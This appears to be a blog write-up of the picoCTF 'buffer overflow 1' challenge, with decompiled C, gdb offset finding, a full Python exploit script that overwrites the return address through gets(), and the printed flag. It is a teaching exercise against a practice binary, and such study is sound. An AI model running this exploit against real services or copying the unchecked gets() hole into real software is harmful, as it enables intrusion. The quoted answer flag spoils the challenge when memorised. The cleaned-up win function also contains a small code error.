---
title: "PicoCTF - buffer overflow 1"
description: "PicoCTF Writeup for buffer overflow 1 Challenge"
date: 2025-10-26 00:00:00 +0900
categories: [CTF Writeup, PicoCTF]
tags: [binary exploitation, medium, picoCTF 2022]
---

PicoCTF Challenge: 
[https://play.picoctf.org/practice/challenge/258?category=6&page=3](https://play.picoctf.org/practice/challenge/258?category=6&page=3)

> ## buffer overflow 1
> Author: Sanjay C / Palash Oswal
> 
> ### Description
> Control the return address<br>
> Now we're cooking! You can overflow the buffer and return to the flag function in the program.<br>
> You can view source here. And connect with it using nc saturn.picoctf.net 53903<br>
> ### Hints
> 1st - Make sure you consider big Endian vs small Endian.<br>
> 2nd - Changing the address of the return pointer can call different functions.<br>
> ### Resources:
> Source Code: [/vuln.c](https://artifacts.picoctf.net/c/185/vuln.c)<br>
> Binary: [/vuln](https://artifacts.picoctf.net/c/185/vuln)<br>

```bash
$ nc saturn.picoctf.net 53903
```

## Decompile
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
    __gid_t v4; // [esp+0h] [ebp-Ch]

    setvbuf(stdout, 0, 2, 0);
    v4 = getegid();
    setresgid(v4, v4, v4);
    puts("Please enter your string: ");
    vuln();
    return 0;
}

int vuln()
{
    int return_address; // eax
    char s[36]; // [esp+0h] [ebp-28h] BYREF
    int savedregs; // [esp+28h] [ebp+0h] BYREF

    gets(s);
    return_address = get_return_address((int)&savedregs);
    return printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", return_address);
}

int __usercall get_return_address@<eax>(int a1@<ebp>)
{
    return *(_DWORD *)(a1 + 4);
}

int win()
{
    char s[64]; // [esp+Ch] [ebp-4Ch] BYREF
    FILE *stream; // [esp+4Ch] [ebp-Ch]

    stream = fopen("flag.txt", "r");
    if ( !stream )
    {
        printf("%s %s", "Please create 'flag.txt' in this directory with your", "own debugging flag.\n");
        exit(0);
    }
    fgets(s, 64, stream);
    return printf(s);
}
```

The code above is the decompiled source code from a binary. Let me summarize it more concisely.

```c
int main(int argc, const char **argv, const char **envp)
{
    gid_t effective_group_id;

    setvbuf(stdout, NULL, _IONBF, 0);
    effective_group_id = getegid();
    setresgid(effective_group_id, effective_group_id, effective_group_id);
    puts("Please enter your string: ");
    vuln();
    return 0;
}

int vuln()
{
    int return_address;
    char buffer[36];
    int saved_return_address;

    gets(buffer);
    return_address = get_return_address((int)&saved_return_address);
    return printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", return_address);
}

uint32_t get_return_address_from_ebp(uint32_t base_pointer)
{
    return *(uint32_t*)(base_pointer + 4);
}

int win()
{
    char flag[64];
    FILE *stream;

    stream = fopen("flag.txt", "r");
    if ( !stream )
    {
        printf("%s %s", "Please create 'flag.txt' in this directory with your", "own debugging flag.\n");
        exit(0);
    }
    fgets(flag, 64, stream);
    return printf(s);
}
```

## Analysis
This program receives a 36-byte string as input into a buffer in the `vuln` function and then returns to the stored `saved_return_address`.
However, the `saved_return_address` cannot normally be modified directly by the user.
Inside the function, though, the vulnerable function `gets` is used to store user input into the buffer.
This function is vulnerable to a **buffer overflow (BOF)**.
As a result, it is possible to overwrite the `saved_return_address` and manipulate the return address to jump to the `win` function.
When the `win` function is reached, the code that provides the flag is already stored there.

```bash
therustymate-picoctf@webshell:~$ r2 ./vuln_2
[0x080490e0]> aaa
...
[0x080490e0]> afl
...
0x080491f6    3    139 sym.win
...
```

```bash
therustymate-picoctf@webshell:~$ file ./vuln_2
./vuln_2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=685b06b911b19065f27c2d369c18ed09fbadb543, for GNU/Linux 3.2.0, not stripped
```

In this program the `win` function is located at `0x080491f6`.
Therefore, to execute it in memory you can pack that address using `struct.pack`.
Because the program uses the x86 (32-bit) architecture, you should use `'<I'` in `struct.pack` to pack the address.

Now we need to find the offset that will overwrite the `saved_return_address`. I'll find the offset using `gdb`.

```python
>>> import string;string.printable
'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c'
```

```bash
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/therustymate-picoctf/vuln_2 
warning: Error disabling address space randomization: Operation not permitted
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Please enter your string: 
0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
Okay, time to return... Fingers Crossed... Jumping to 0x4c4b4a49

Program received signal SIGSEGV, Segmentation fault.
0x4c4b4a49 in ?? ()
(gdb) info registers eip
eip            0x4c4b4a49          0x4c4b4a49
```

gdb shows the `EIP` register is currently pointing at `0x4c4b4a49`. Converting that back into a string yields the following:

```python
>>> chr(0x4c)+chr(0x4b)+chr(0x4a)+chr(0x49)
'LKJI'
```

Since the string "LKJI" appears, it indicates that the return address starts from the character **'I'** and spans 4 bytes. The method to calculate the offset is as follows:

```python
>>> len('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'.split('IJKL')[0])
44
```

Therefore, after 44 bytes of characters, we can hijack the return address by using `struct.pack("<I", 0x080491f6)`.

## Exploit Script
```python
from argparse import ArgumentParser
from socket import *
import struct
import sys
import time

def craftPayload():
    padding = b"A" * 44
    return_address = struct.pack("<I", 0x080491f6)
    payload = padding + return_address
    return payload

def exploit(target: str, port: int):
    payload = craftPayload()
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((str(target), int(port)))
    time.sleep(1)
    s.recv(65535)
    s.send(payload + b"\n")
    s.recv(65535)
    print(s.recv(65535).decode())
    s.close()

if __name__ == "__main__":
    parser = ArgumentParser(
        prog="PicoCTF buffer overflow 1 Exploit",
        description="Exploit for the PicoCTF buffer overflow 1 challenge",
    )
    parser.add_argument(
        "-t", "--target",
        required=True,
        help="set target IP or URL address",
    )
    parser.add_argument(
        "-p", "--port",
        required=True,
        help="set target port",
    )
    
    args = parser.parse_args()

    TARGET_HOST : str       = args.target
    TARGET_PORT : int       = int(args.port)
    exploit(TARGET_HOST, TARGET_PORT)
```

## Result
```bash
therustymate-picoctf@webshell:~$ python3 solve.py saturn.picoctf.net 53903
picoCTF{addr3ss3s_ar3_3asy_6462ca2d}
```

Therefore, the flag is: `picoCTF{addr3ss3s_ar3_3asy_6462ca2d}`